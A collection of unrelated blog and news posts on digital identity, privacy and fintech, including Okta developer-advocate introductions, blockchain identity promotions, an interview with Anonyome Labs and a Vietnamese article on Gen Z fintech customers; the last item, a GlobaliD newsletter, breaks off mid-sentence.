<p>Fast forward to 2021: I have more than a decade of experience wearing all sorts of hats in IT, working with a dozen languages and all sorts of tech. I’m a jack of all trades and master of some. At TCS, I spend 2011-2016 in Singapore working for its airline customers. I started out building Java web apps for enterprises, did a lot of JavaScript and UX engineering, built mobile apps, led some teams, managed projects, and finally was part of a pre-sales team proposing architectures, building prototypes, and so on. I was also the go-to JS person there. This is when I started getting into open source, discovered <a href="https://www.jhipster.tech/">JHipster</a>, and fell in love with it.</p>

<p>I now co-lead JHipster along with <a href="https://twitter.com/juliendubois">Julien Dubois</a> and <a href="https://twitter.com/pascalgrimaud">Pascal Grimaud</a>. While I don’t actively code that much for JHipster these days, somehow, I still hold the number two position in terms of contributions 😉. Fun fact: Okta was an early supporter of JHipster, and thanks to <a href="https://developer.okta.com/blog/authors/matt-raible/">Matt Raible</a>, Okta is now the platinum sponsor for JHipster.</p>

<p>In 2016, I moved to the Netherlands to join a DevOps startup and helped build an analytics product, developer tooling, and cloud and container integrations. I worked mainly with Java, TypeScript, and Golang. This is where my fascination for cloud and container tech began. I had been doing some advocacy all along for JHipster and DevOps by writing content, giving conference talks, meetups, and so on. In 2020, I officially became a paid Developer Advocate for Adyen, a unicorn in the fintech space.</p>

<p>As part of my open-source software endeavors, I continue contributing to Java and JS communities. Recently I got fascinated with Rust and built a Kubernetes dashboard in Rust, called <a href="https://kdash.cli.rs/">KDash</a>. I’m hoping to get more involved in the Rust community as well.</p>

 What I’ll be doing at Okta 

<p>As someone who has been following Okta closely for many years, it’s an honor to be here finally. Though I have dabbled in many things and was fortunate to work with a lot of different technologies, my expertise is still around Java, JS, Golang, Rust, and DevOps. I hope to use my skills to contribute to those communities as much as possible while making Okta a well-known name in the DevOps space. Stay tuned for more content, talks, and OSS contributions in those areas. While here, I also hope to improve the developer experience of using Okta products, especially in the DevOps space.</p>

 How to get in touch 

<p>You can find me on <a href="https://twitter.com/deepu105">Twitter</a>, <a href="https://www.linkedin.com/in/deepu05">LinkedIn</a> or <a href="https://github.com/deepu105">GitHub</a>. You can also write to <code>deepu.sasidharan@okta.com</code>. I have an active tech blog at <a href="https://deepu.tech/blogs/">deepu.tech</a>, where you can find me writing about my love for Linux, why I like Rust, or my opinion on tech in general, among other content. You will also find me writing technical pieces on this blog very soon.</p>

 From early ID management systems to the birth of Blockchain, learn how Shyft Network is building the most secure future for trust and identity. <p>Identity has been a contentious point for humanity ever since we evolved societies. How are we sure that someone is who they say they are? Before the modern age, there were several ways ancient civilizations did identity verification. Unfortunately, the scope and viability of those methods went out the window during the information age — and even more so during the dawn of the internet, as human interaction started to become replaced by digital connection. The internet’s identity and trust problems weren’t much of an issue when it first saw use. Most people would use phone lines to dial into bulletin board systems. Phone lines were linked to addresses, which were tied to people living in the house. If someone had enough patience, they could locate who was dialing into their BBS. However, the internet has evolved since then, to put it lightly, and its identity problems have kept pace with&nbsp;it.</p> The Story of Trust&nbsp;Online <p>As more casual users started to take advantage of the internet with Web1.0, individual data would have to be batched out. As the rise of personal experience websites came onto the scene, the back end needed to know which user data it should show to the person sitting at the screen. Developers solved this by constructing credential systems. Usernames and passwords would be stored on databases (sometimes encrypted) and were handy enough to be carried across ecosystems. Unfortunately, when you have a centralized database of usernames and passwords, the attack vectors for obtaining access to them are trivial. In the early days of login authentication, many young users tested their skills attempting to break into these Web1.0 databases, and many succeeded.</p><p>These early, clunky user-password authentication efforts evolved into ID management systems run by large corporations with the rise of Web2.0. Now, users can log in with a single click, using the API to share their login verification with whatever website requests it. This approach made it easier for developers to onboard users since it had much less friction than forcing them to sign up for a new account. Users today have several dozen accounts already on sites they might only use once. The obvious drawback of this system is that you can be banned or restricted if you go against the data holders. As an added bonus, these companies routinely sell the data they collect from users to third parties for all sorts of purposes, usually without the user being aware of it. While we’d like to think these massive corporations are secure, the sheer amount of data leaks coming from businesses like Facebook shows that this is a vain&nbsp;hope.</p> The Evolution of Blockchain Trust <p>In 2008, Satoshi Nakamoto created Bitcoin intending to develop a trustless ecosystem for financial transactions. In essence, the Bitcoin blockchain is a conversation between two parties. The recipient asks, “Do you have the BTC I requested?” and the sender replies with a yes or a no, backed up by the blockchain’s record of their currently accessible funds. Bitcoin has its own problems, but the principle of a trustless network is sound, as has been evidenced by the widespread adoption of the world’s first cryptocurrency. Shyft Network seeks to take what Bitcoin developed and evolve it to the next level. But how do we intend to do&nbsp;that?</p> Shyft Into High&nbsp;Gear <p>A blockchain can bring about tangible change in the world. Shyft Network is doing so by providing users and third parties with a single decentralized method of verifying credentials. The Shyft ecosystem involves several stakeholders, each with their part to&nbsp;play.</p><p>Ø The Data Owners and Data Holders: Data owners are individuals or organizations that credentials refer to. They may or may not be trusted entities, but they can interact with Trust Anchors (Data Holders) to verify their identity or the validity of the data. In fact, any data can be contextualized via attestations and&nbsp;TAs.</p><p>Ø Trust Anchors (Attestors): These are trusted entities that collect data from issuers and holders. They verify the identities of these individuals or organizations and hold the data off-chain. If the data owner would like to pass that data to a third party, they wouldn’t need to pay a fee for transferring that validated data. However, third-parties, such as aggregators could potentially pay for that data before the data-owner’s consent.</p><p>Ø Data Consumers: These entities provide pre-approved app services which utilize trusted data. They’re responsible for requesting data from holders, reviewing attestations, and determining whether that data is&nbsp;usable.</p><p>Ø Validators (Nodes): Nodes perform much of the same work as on other blockchains — they validate the transactions and add them to the&nbsp;chain.</p><p>Ø Consent Framework: Today’s users have become used to companies hiding privacy data inside their setting’s menus. Shyft Network operates on a strict opt-in system that allows users to control who gets their&nbsp;data.</p><p>Ø Proof of Individual: How do you know that the sender probably has what they’re offering? With the Shyft Network, it’s a simple matter of verifying the blockchain address. With all data pertaining to an individual linked to this address, it’s impossible to spoof identities.</p> Reliability and Dependability <p>The Shyft Network aims to provide a method for users to share data with the companies they see fit. As an opt-in system, the data holder can deal with each request for their data individually. However, the Shyft Network offers more than just a method of verifying users. Some of the most current use cases have demonstrated the flexibility of the platform.</p><p>Ø Financial Action Task Force (FATF) Travel Rule Compliance: The FATF recently issued crypto-specific guidance recommending jurisdictions to require Virtual Asset Service Providers (or VASPs), (such as cryptocurrency exchanges) to provide sender and recipient data on request. Yet, at current, there exists no way to comply with the FATF guidance. By partnering with some of the world’s most trusted cryptocurrency exchanges, like Binance and Tether, the Shyft Network has helped design and implement a solution to this&nbsp;problem.</p><p>Ø Compliant Decentralized Finance: De-Fi has had regulators up in arms, trying to lock down much of the innovation within the space. Large liquidity providers, for example, cannot interact with the De-Fi space because of a lack of clarity from regulators’ perspectives. Shyft Network is a decentralized solution that considers these outdated or obsolete perspectives that regulators may have and combines it with a way for liquidity providers to verify themselves in a way that complies with the regulations.</p><p>Ø Government Digital Identity: Identity fraud is a real danger, but with a trustless verification system like Shyft, a seamless, single verification is all that any citizen or organization within a country needs. Through Shyft, governments have a platform to create Know-Your-Customer (KYC) systems that are seamless to interact with and provide easy verification for all users. With this seamless verification comes security, interoperability, and transparency. Data collected would be readily available to regulators and auditors within the confines of privacy&nbsp;rules.</p><p>All of these use cases only scratch the surface of what Shyft is capable of, especially as we roll out open-sourcing of <a href="https://veriscope.network/">Veriscope</a>, our latest and great DeFi compliance framework and smart-contract platform for VASPs to enable travel rule compliance. While we already have an idea of what can be done with our growing infrastructure, we’re excited to see how the evolution of the blockchain will bring about new and innovative approaches to personal verification within cyberspace. Stay&nbsp;tuned.</p><p>Shyft Network aggregates trust and contextualizes data to build an authentic reputation, identity, and creditability framework for individuals and enterprises.</p><blockquote>Join our <a href="https://www.shyft.network/signup?userType=network">Newsletter</a></blockquote><blockquote>Telegram (<a href="https://t.me/shyftnetwork">https://t.me/shyftnetwork</a>)</blockquote><blockquote>Follow us on Twitter (<a href="https://twitter.com/shyftnetwork">https://twitter.com/shyftnetwork</a>)</blockquote><blockquote>Check out our GitHub (<a href="https://github.com/ShyftNetwork">https://github.com/ShyftNetwork</a>)</blockquote><blockquote>Check out our website (<a href="https://www.shyft.network/">https://www.shyft.network</a>)</blockquote><blockquote>Check out our Discord (<a href="https://discord.gg/ZcBNW37t">https://discord.gg/ZcBNW37t</a>)</blockquote>

				 <p>A distributed ledger is a database that has copies distributed across a network of servers (nodes), all of which are updated simultaneously. A network like this is the foundation of decentralized identity, a way of generating robust trust and collaboration free of the security risks of centralized databases. We call the companies and organizations that support an Indicio Network node on a server that is under their control “Node Operators.”&nbsp;</p>
<p>&nbsp;</p>
<p>Recently we caught up with Paul Ashley, CTO and Co-CEO of Anonyome Labs, a current Node Operator of Indicio, to discuss their current projects, some goals for the future, and where they think decentralized identity is heading.</p> 
			  
				
				
				 <p>Tell us about Anonyome: how did it start, where did it start, and who makes up your team?</p>
<p>The goal of Anonyome Labs is to shift the control of personal information back to normal users.&nbsp;</p>
<p>Everything we do is recorded, collected, mined, profiled, stored, targeted and sold. The balance of power has shifted to the cabal of tech giants and data miners who overtly or covertly monitor and control what is seen, clicked, and cared about. At Anonyome Labs we build the tools that shift control of personal and private information from the big data miners back to the user.&nbsp;</p>
<p>Anonyome Labs was founded in 2014 and is headquartered in Woodside California, with teams in Salt Lake City, Utah and Gold Coast, Australia. Anonyome Labs has about 70 employees –&nbsp; the teams have deep enterprise and consumer expertise across identity, cyber security, authentication, authorization, privacy and cryptography – with hundreds of granted patents. </p>
<p>What are some of the products/services (Self Sovereign Identity or not) that you currently offer? Who are your target customers? What sets you apart from the competition?</p>
<p>Anonyome Labs created the Sudo Platform to provide enterprise software developers with capabilities to add persona (Sudo) based identity, privacy and cyber safety features to their applications. The Sudo Platform provides to these enterprise software developers mobile and web SDKs, sample apps, documentation and UI Kits to accelerate their application development.&nbsp;</p>
<p>Each of the capabilities of the Sudo Platform is attached to a persona. This includes masked email and masked credit cards, private telephony, private and compartmentalized browsing (with ad/tracker blocker and site reputation), VPN, password management, decentralized identity and more.</p>
<p>In addition, Anonyome Labs created the MySudo mobile application to put the same identity, privacy, and cyber security capabilities into the hands of normal users for their interactions with the online and offline world.&nbsp; Each user is able to create a number of personas (Sudos) and with each of them have access to various Sudo Platform capabilities.</p>
<p>What Self Sovereign Identity /Decentralized Identity products/services are on your roadmap?</p>
<p>A key offering of the Sudo Platform is Decentralized Identity based services.&nbsp; This includes both client (Edge Agent) and server (Cloud Agent) offerings.&nbsp; This allows the enterprise to become a Decentralized Identity Verifiable Credential Issuer and/or Validator. And it allows the enterprise’s users to take part in a decentralized identity ecosystem – by giving them a mobile wallet/agent to manage decentralized identities, connections and verifiable credentials.</p>
<p>What motivated your work in Decentralized Identity? Why did you become a node operator? What appeals to you in this field?</p>
<p>We believe that Decentralized Identity is the most important innovation in identity to help normal users have control over their personal information as they interact with the online world.&nbsp; Given Anonyome’s focus on privacy and cyber safety,&nbsp; it was a natural extension to our Sudo Platform to add Decentralized Identity services. Anonyome Labs became a founding steward of the Indicio decentralized identity network in anticipation of using that network for our customer’s enterprise applications.</p>
<p>Where do you see the future of Self Sovereign Identity/Decentralized Identity?</p>
<p>It is our belief that decentralized identity will become the core foundational technology of future privacy and cyber safety capabilities.&nbsp; Over time we will transition from the current privacy invasive technologies, to new systems founded on decentralized identity.</p>
<p>&nbsp;</p>

<p>Introduction</p>
<p>Every week there seems to be mention of a new Trust Framework. People are now trying to monetize them.</p>
<p>But to understand trust frameworks, let’s first understand what constitutes trust. We must define concepts such as levels of assurances and what defines technical vs human trust?</p>
<p>Once this is better understood, the conversation about where a particular organization fits into a digital identity ecosystem is simpler. And note, in user-centric digital identity (or SSI), organizations no longer need to be at the centre of the universe.</p>
<p>About Episode<br>
During this conversation, we discuss:</p>
 
 Levels of Assurance (LOA): an introduction to LOAs as they relate to Digital Identity and why they’re an important part of the recipe in achieving digital trust. Tim and Darrell give us some practical examples of LOAs. 
 The Concept of Trust: how do we define trust at a high-level and how do we differentiate between technical and human trust? How can we build trust with credential issuers but also with credential holders? 
 The World of Trust Frameworks: what are trust frameworks and what are different types of frameworks being deployed in both the public and private sectors? How are organizations trying to monetize trust frameworks? What’s going right, and what’s going wrong with the way trust frameworks are being implemented? 
 The Importance of Open Source for Trust Creation: why is open source important for achieving digital sovereignty? Is open source the only way to improve transparency, flexibility and accountability?

<p>The&nbsp;New York Times&nbsp;recently did a&nbsp;<a href="https://www.nytimes.com/wirecutter/blog/state-of-privacy-laws-in-us/">deep dive</a>&nbsp;into the United States’ lack of a&nbsp;<a href="https://anonyome.com/2021/04/a-us-national-privacy-law-looks-more-likely-than-ever/">national data privacy law</a>&nbsp;and why it matters, and we want to drill down on some key points here.</p>



<p>The article describes the&nbsp;four basic areas&nbsp;of users’ data privacy that should be protected as a&nbsp;minimum, and calls these areas the “floor” of any future national privacy law onto which other protections could be built over time. It shows you the direction in which privacy advocates are heading.</p>



 Four basic areas make up the privacy law “floor”: 



<p></p>



  Data collection and sharing rights&nbsp;– This is the user’s fundamental right to clearly see what&nbsp;<a href="https://anonyome.com/2020/05/what-constitutes-personally-identifiable-information-or-pii/">personal data</a> companies collect, share and sell about them; their right to ask a company to delete any personal data they don’t want them to have; and their right to demand a company stop sharing their personal data.&nbsp;  Opt-in consent&nbsp;– This is where a company, not the user, does the heavy lifting on privacy, by asking the user whether they may collect, share or sell their data to third parties. Opting out takes the user a lot of time and effort; opting in puts that effort on the company. But opt-in isn’t easy to implement, which is why global opt-out functions like the&nbsp;<a href="https://www.theverge.com/2021/1/28/22252935/global-privacy-control-personal-data-tracking-ccpa-cpra-gdpr-duckduckgo">Global Privacy Control</a>&nbsp;are a popular stopgap, even&nbsp;<a href="https://digiday.com/marketing/californias-attorney-general-backs-call-for-global-privacy-control-adoption-with-fresh-enforcement-letters-to-companies/">seeming acceptable</a>&nbsp;under the&nbsp;<a href="https://oag.ca.gov/privacy/ccpa">California Consumer Privacy Act</a>. The GPC and other tools like it allow opt out at the browser or device level, not the site level.&nbsp;  Data minimization&nbsp;– This protection would pare back the data a company can collect to only the basics required for them to deliver their product or service.&nbsp;  Non-discrimination and no data-use discrimination&nbsp;– The final plank in the basic data privacy “floor” would protect users from being discriminated against for exercising their right to privacy. This means users couldn’t be charged more for opting out (or not opting in) and couldn’t be offered incentives such as discounts and coupons for opting in, for example. This requirement would also prevent companies from discriminating against users based on personal characteristics, such as religion, race or gender.&nbsp;  



 In addition to this four-plank “floor”, the privacy experts interviewed for the&nbsp;NYT&nbsp;article would like to see:&nbsp; 



<p></p>



  a more comprehensive&nbsp;<a href="https://mysudo.com/2020/11/what-is-a-data-breach/">data breach</a>&nbsp;notification law, to standardize who gets notified and some common standards for doing so  a private right of action or the right of a person to sue a company that violates their privacy  strong, well-funded enforcement agencies and resources&nbsp;  <a href="https://www.ics.ie/news/what-is-privacy-by-design-a-default">privacy by default&nbsp;</a>so apps come with the strictest built-in privacy without the user having to do anything unless they want to opt-in to certain settings.  



<p>Anonyome Labs agrees with the four-plank data privacy law “floor” and the regulatory extras proposed by the privacy community in this article. We also recognize that a national privacy law and a uniform approach to these requirements may still be a long way off, which is why we created our consumer privacy app&nbsp;<a href="https://mysudo.com/2020/10/mysudo-private-secure/">MySudo</a>&nbsp;and the privacy and cybersecurity capabilities in&nbsp;<a href="https://sudoplatform.com/">Sudo Platform</a>&nbsp;that help enterprises rapidly develop and deploy branded privacy and cybersecurity solutions.</p>

Ontology has achieved full compatibility with the Ethereum ecosystem. Developers can directly use EVM development tools on the Ontology TestNet for dApp deployment.   Ontology in the&nbsp;Media <p>BeInCrypto — <a href="https://beincrypto.com/third-times-a-charm-establishing-secure-data-and-identities-in-web-3-0/">Third Time’s A Charm: Establishing Secure Data and Identities In&nbsp;Web3</a></p><blockquote>The internet is currently in a liminal phase. It is sitting on the precipice of changes that will shake up human life in ways that we could have only imagined ten years ago. Web3 is the internet’s third iteration. It is seeing the digital sphere become more open-source.</blockquote><p>As a highly interoperable chain network and the multi-virtual machine solution, Ontology is equipped for the coming transition to Web3. Whether you are a senior blockchain developer or a traditional web developer, you can quickly become familiar with the Ontology development environment, easily deploy blockchain applications, and enjoy fast block confirmation speeds and low deployment costs.</p><p>The Defiant — <a href="https://thedefiant.io/how-decentralized-identity-can-take-crypto-to-the-next-level/">How Decentralized Identity Can Take Crypto to the Next&nbsp;Level</a></p><blockquote>Over the past year, there has been a notable increase of awareness and interest towards decentralized identity solutions. Decentralized identity solutions help users, amongst other things, to control their digital identity without the input of intermediaries. As well as the individual user benefits, decentralized identity solutions have the potential to create seamless, accessible, and verifiable ecosystems. Decentralized identity holds the potential to solve many issues across the DeFi sphere and&nbsp;more.</blockquote><p>Ontology brings trust, privacy, and security to Web3 through decentralized identity and data solutions. They’ve developed a comprehensive identity infrastructure including an identity wallet that allows you to easily create digital identities, a composable, cross-chain reputation protocol, and a DeFi protocol that leverages your decentralized identity and self-sovereign reputation to enable undercollateralized loans.</p> Want more Ontology? <p>Learn more about our decentralized data and identity solutions on our <a href="https://ont.io/">website</a> and official <a href="https://twitter.com/OntologyNetwork">Twitter</a> account.

  <p>Hi, I’m edunham, and I’m an infra person. Our buzzwords include DevOps, Cloud Operations, and Site Reliability Engineering, though if you ask any two of us about the difference between those terms, you’ll get at least three answers. Whatever name it’s wearing, doing ops well requires not only the “how” of changing systems, but also the “why” of making the right changes. Although I’ve always loved helping spread the information that my colleagues need in order to build the systems that work best for them, I’ve chickened out of taking the leap into pure advocacy many times, before finally diving into it here at Okta!</p>

<p></p>

<p>I got my start in open source and the tech industry as a student software developer and sysadmin at the <a href="https://osuosl.org/">OSU Open Source Lab</a>. The OSL gives students hands-on expertise with skills essential to those careers, and there weren’t enough of us to satisfy all the companies who wanted to hire us as interns! To help address this problem, I created the first iteration of our <a href="http://devopsbootcamp.osuosl.org/">DevOps Bootcamp</a> training program. I was amazed by how good it felt to take information I was lucky enough to have special access to and share it with others who found it useful. When looking at where to steer my career after university, I considered building on my growing resume of talks to pursue evangelism roles, but it wasn’t time yet. I wanted to go out and apply my skills at scale, rather than just talking about them.</p>

<p></p>

<p>As ops for the Rust and Servo teams at <a href="https://research.mozilla.org/">Mozilla</a>, I was again able to play the positive-sum game of sharing the most interesting and useful insights I learned from my unique access to fantastic engineers. But as the sysadmin and speaker roads diverged in that forest of mercurial trees, I stuck with the ops route.</p>

<p>Missing the conference circuit as growing responsibilities meant less time for talks, I started working on a transition toward advocacy in early 2020. Faced with a choice between making the switch then or building on my ops skills for a while longer, the engineer in me won out. Switching fields, into a field that was frantically reinventing itself at the time, was just too many simultaneous changes to roll out to prod without any staging environment  or CI available.</p>

<p>Okta’s developer advocacy team is in the right place at the right time for me. I get to use <a href="https://edunham.net/pages/talks.html">my background</a> to help useful information flow out of the company to our community, as well as bringing the community’s observations and insights back to contribute to internal decision-making. Our product has made my life better as an engineer whenever I’ve worked with it, increasing my knowledge about how to do security well.</p>

<p></p>

<p>I’ve been working remotely since 2018, and I put the time that I would otherwise spend commuting into gardening and an assortment of maker projects, which I sometimes mention on <a href="https://edunham.net/">my blog</a>. I’m a volunteer firefighter and emergency medical responder with my local fire department, and I play tuba and sousaphone poorly but enthusiastically on the now-rare occasions when we can get enough people together to make some music.</p>

<p>You can find me on GitHub and some IRC networks as <code>edunham</code>, and on Twitter and LinkedIn as <code>qedunham</code>, or email me, <code>e.dunham@okta.com</code>!</p>

<p>Millennials và Gen Z đã luôn là đối tượng khách hàng trung tâm mà Fintech xoay quanh để phát triển. Song, đặt tại bối cảnh của Việt Nam, hai thế hệ này mang vai trò mạnh mẽ hơn cả, đòi hỏi các Fintech startup và cả các doanh nghiệp tài chính truyền thống liên tục thích nghi để đáp ứng các nhu cầu của họ. Bài viết này để cập đến tầm quan trọng của gen Z &amp; Millennials đối với Fintech tại Việt Nam, lối suy nghĩ về tài chính của họ, cũng như đưa ra các chiến lược cho doanh nghiệp xây dựng lòng trung thành từ hai nhóm khách hàng này.</p>



 GenZ và Millennials trong bối cảnh Việt Nam 



<p>Gen Z và Millennials lần lượt là các thế hệ sinh trong khoảng năm 1997 đến 2012 (gen Z) và 1981 đến 1996 (Millennials)[1]. Với độ tuổi từ 9-40 (năm 2021), họ sẽ sớm chiếm phần lớn lực lượng lao động, mang trong mình sự khác biệt đột phá nhờ sinh ra và lớn lên trong thời đại số hóa. Nhờ chất lượng và năng suất lao động vượt trội, cũng như điều kiện kinh tế thuận lợi, gen Z và Millennials cũng được dự đoán sẽ có mức thu nhập cao hơn và trở thành những người tiêu dùng cực kỳ tiềm năng.</p>



<p>Việt Nam, với nhiều tiềm năng về thị trường và nguồn lực, đang trong đà phát triển Fintech mạnh mẽ, thu hút 36% vốn đầu tư của khu vực Đông Nam Á năm 2019, chỉ sau Singapore, theo báo cáo của PWC[2]. Song, Việt Nam vẫn là một đất nước phụ thuộc nhiều vào tiền mặt và có nhiều người chưa có tài khoản ngân hàng (69%, theo Merchant Machine UK, 2021[3]), nên vẫn còn nhiều thị trường cho Fintech khai phá. Với bối cảnh thị trường đó, giới trẻ tại Việt Nam mang vai trò định hình mạnh mẽ hơn cả cho thị trường dịch vụ tài chính, so với các thị trường fintech đang dần bão hòa tại các nước đang phát triển.</p>



 Những thế hệ có lối đi riêng trong hành trình tìm kiếm tự do tài chính 



<p>Dù có nhiều sự khác biệt nhất định giữa gen Z và Millennials, họ vẫn có nhiều điểm tương đồng nhất định mà doanh nghiệp có Gen Z và Millennials tại Việt Nam là một thế hệ đặc biệt. Họ chứng kiến một Việt Nam “chuyển mình” nhanh chóng, từ thời kỳ bao cấp đến công cuộc Đổi Mới và nền kinh tế năng động, với tăng trưởng GDP hằng năm lên đến 7%. Và ở hiện tại, họ đang chứng kiến những sự biến động của Việt Nam trước đại dịch. Những chuyển biến đó ít nhiều ảnh hưởng đến tâm lý của Gen Z và Millennials.</p>







<p>Lớn lên trong một Việt Nam đầy biến động, Gen Z và Millennials có động lực tìm cho mình sự an toàn về mặt tài chính. Nhờ có mạng internet, họ được tiếp cận nguồn thông tin phong phú, và mở ra đa dạng hơn những cách kiếm thêm thu nhập bên cạnh những công việc “9 to 5” – những công việc truyền thống 9 giờ một ngày vốn quen thuộc với các thế hệ trước. Ngoài ra, đây cũng là thế hệ quan tâm nhiều hơn về đầu tư như cổ phiếu, bất động sản, tiền ảo (cryptocurrency),… tạo cơ hội cho Fintech bùng nổ.</p>



<p>Sự thay đổi quá nhanh chóng trong bối cảnh kinh tế xã hội cũng góp phần làm tăng lên khoảng cách thế hệ giữa Gen Z, Millennials và các thế hệ trước. Các phương thức kiếm thu nhập mới của họ thường liên quan đến không gian internet và rất khó để ghi lại theo các phương thức truyền thống. Đây cũng là một rào cản lớn khi hai thế hệ này muốn tham gia các dịch vụ tài chính truyền thống để đầu tư cho những nhu cầu của mình.</p>



<p>Chân dung khách hàng của các doanh nghiệp đã trở nên rất khác. Tư duy truyền thống đã không còn áp dụng được cho Gen Z và Millennials.</p>



 Cách nào để Fintech xây dựng niềm tin và lòng trung thành trong một thế giới đầy biến động 



<p>Cũng vì là thế hệ sống trong thời đại của thông tin mà gen Z và Millennials cũng là các khách hàng khó giữ chân. Theo Kasasa, 83% Millennials thừa nhận họ sẵn sàng đổi dịch vụ ngân hàng hiện tại để đổi lại các lợi ích cung cấp bởi các ngân hàng khác[4]. Là thế hệ sinh ra trong thời đại công nghệ, với khoảng thời gian tập trung ngày càng ngắn, gen Z và Millennials ngày càng trông đợi sự tiện lợi và dễ dàng trong các hoạt động hằng ngày, bao gồm cả hoạt động tài chính, vốn vẫn có nhiều thủ tục nhiêu khê.</p>



<p>Từ gamification (game hóa) đến liên tục tạo nhiều chương trình ưu đãi hấp dẫn, mỗi doanh nghiệp có một chiến lược riêng để giữ chân khách hàng gen Z &amp; Millennials. Những xu hướng nhìn chung có thể thấy như sau:</p>



 Trải nghiệm liền mạch, dễ dàng 



<p>Liên tục cải tiến UI/UX là một điều kiện cần của dịch vụ tài chính thời đại số. Khách hàng Gen Z và Millennials cần những dịch vụ tài chính an toàn, tiện lợi để phục vụ cho nhu cầu của họ. <a href="https://credify.one/vi/nen-tang-servicex/">serviceX </a>giúp kết nối các sản phẩm tài chính đến khách hàng khi họ thanh toán cho các dịch vụ đời sống, với thao tác đăng nhập dễ dàng thông qua Open ID Connect.</p>







 Tạo giá trị bền vững 



<p>Ngoài những mối quan tâm về các “hot trend” (xu hướng), gen Z và Millennials còn quan tâm sâu sắc đến việc tạo giá trị bền vững cho cộng đồng. Vì thế, để tạo sự gắn kết với khách hàng trẻ, các doanh nghiệp dịch vụ tài chính cần quan tâm đến những vấn đề như: tài chính toàn diện, giảm nghèo đói và bất bình đẳng, công bằng xã hội,…</p>



 Tận dụng dữ liệu lớn (big data) 



<p>Khi các hoạt động hằng ngày của gen Z và Millennials diễn ra nhiều hơn trên không gian mạng, doanh nghiệp cần có những cách tiếp cận mới để hiểu khách hàng của mình. Thành công trong việc hiểu được hồ sơ kỹ thuật số (digital identity) và tận dụng những insight từ dữ liệu lớn sẽ giúp doanh nghiệp có cái nhìn sâu sắc hơn về khách hàng của mình, từ đó dễ dàng có chiến lược chinh phục khách hàng hiệu quả.</p>



 Minh bạch trong quản lý 



<p>Theo khảo sát của Salesforce, chỉ 55% Millennials và 44% Gen Z cảm thấy thoải mái với cách các công ty đang sử dụng thông tin của họ[5], phần nào phản ánh sự thiếu tin tưởng của họ với các công ty, đặc biệt là các công ty Fintech với nhiều dữ liệu nhạy cảm như số tài khoản ngân hàng, thông tin giao dịch,… Thực trạng này đòi hỏi các công ty Fintech cần minh bạch hơn trong việc lưu trữ và quản lý thông tin của người dùng, cũng như tăng cường các biện pháp bảo mật thông tin.&nbsp;</p>



 Đa dạng hóa các sản phẩm dịch vụ 



<p>Các startup Fintech nổi bật với nhiều giải pháp đột phá, nhưng đồng thời bị giới hạn trong số lượng sản phẩm có thể cung cấp cho người dùng. Ngược lại, các tổ chức tài chính truyền thống có đa dạng sản phẩm nhưng lại thiếu tính đột phá để thu hút các khách hàng gen Z và Millennials. serviceX có thể giúp cả hai nhóm doanh nghiệp này kết nối với hệ sinh thái đối tác của Credify, giúp họ tiết kiệm nguồn lực và tập trung vào việc phát triển sản phẩm, đồng thời có thể sáng tạo các giải pháp mới dựa trên hồ sơ của khách hàng trên các nền tảng khác nhau.</p>

 GiD Report#181 — The future will be self sovereign <p>Welcome to The GiD Report, a weekly newsletter that covers GlobaliD team and partner news, market perspectives, and industry analysis. You can <a href="https://medium.com/global-id/gid-report-180-the-facebook-problem-b253ccbca5aa">check out last week’s report&nbsp;here</a>.</p><p>This week:</p>  Understanding the Sovereignty Stack  The problem with&nbsp;Tether  Chart of the&nbsp;week  Stuff happens   1. Understanding the Sovereignty Stack <p>The elegance of Bitcoin is that it was the right idea at the right time. A confluence of pre-existing technologies, the concept of a decentralized ledger pushed all the right buttons in the wake of the 2008 financial crisis. From big bank bailouts to quantitative easing, here was a bottom up solution that reframed how we thought about value — value that was innately digital in the spirit of the internet.</p><p>Just as the World Wide Web empowered people to connect and share knowledge and information, the rise of Bitcoin taught us that we could have direct ownership over our valuable assets and payments — no middle man or central operator necessary.</p><p>Twelve years after Satoshi’s white paper, Bitcoin and crypto at large are at a crossroads. With a market value north of $2 trillion, crypto is impossible to ignore — with much of the participation coming from grassroots retail investors. That’s the thing about crypto. Everyone gets a seat at the table. You don’t need to be an accredited investor. You don’t need to wait for an IPO — after all the insiders already benefited from the initial upside. All you need is a non-custodial wallet that you control. (And, of course, with opportunity and access comes responsibility and&nbsp;risk.)</p><p>But with maturation comes a new set of expectations. Regulators and the powers that be are paying attention.</p><p>It would be easy to argue that much of Coinbase’s success in the American market is due to the fact that they’ve always taken compliance seriously — stuff like proper KYC and AML protocols (Know Your Customer and Anti-Money Laundering).</p><p>Just as the WWW made IP addresses humanistic with domain names, our blockchain public/private keys will ultimately be tied to an identity — our names. For the burgeoning DeFi space, that will be a likely next step. For crypto to grow up, we need to establish identity and&nbsp;trust.</p><p>But that’s also where the elegance of Bitcoin, the internet, and the decentralized movement comes back into&nbsp;play.</p><p>Just as you own and control the BTC in your noncustodial wallet, so should you control your identity and the data behind&nbsp;it.</p><p>We should have ownership over identity, our communications, and our money. That’s the Sovereignty Stack.</p><p>To learn more about the self-sovereign future, <a href="https://www.youtube.com/watch?v=CyGggZ2pT1I">check out this recent METACO interview with GlobaliD co-founder and CEO Greg&nbsp;Kidd</a>.</p><p>Here’s <a href="http://global.id/">/gregkidd</a>:</p><blockquote>There’s an expression in philosophy called a bundle of sticks. And our identity is really that — that bundle of sticks. It can even include things like: I own a bicycle that I really identify with. And so it’s all those attributes that persist over time. If you can’t prove them, and if you can’t control them, then you’re really not in control of your identity. If you have to ask someone else for permission to prove or establish your own identity, once again, you’re not really in control of your identity.</blockquote><blockquote>So when we talk about digital identity and self sovereignty, we’re talking about a form of identity that you can control. That also should be a form that’s interoperable. It shouldn’t live within one app. You want to be able to take those credentials to any other platform. We’re not anti-company or anti-government, but any company or government that’s willing to recognize those credentials should be able to identify you, authenticate you, and then authorize you to do the things you want to&nbsp;do.</blockquote><p>The full interview:</p>  <a href="https://www.youtube.com/watch?v=CyGggZ2pT1I">The Sovereignty Stack: Re-thinking Digital Identity for Web3.0 w/ Greg KIDD [METACO TALKS&nbsp;#23]</a>   Relevant:   <a href="https://www.axios.com/takeaways-facebook-whistleblower-hearing-9f2cddf5-5f8d-4944-87cd-b488bfa3aec1.html">What you need to know from the Facebook whistleblower hearing</a>  Via <a href="http://global.id/">/j</a> — <a href="https://news.bitcoin.com/bitcoin-will-become-currency-in-brazil-soon-according-to-federal-deputy-aureo-ribeiro/">Bitcoin Will Become Currency in Brazil Soon, According to Federal Deputy Aureo Ribeiro — Bitcoin&nbsp;News</a>  Via <a href="http://global.id/">/j</a> — <a href="https://www.forbes.com/sites/stevenehrlich/2021/10/06/the-richest-under-30-in-the-world-all-thanks-to-crypto/">Meet The World’s Richest 29-Year-Old: How Sam 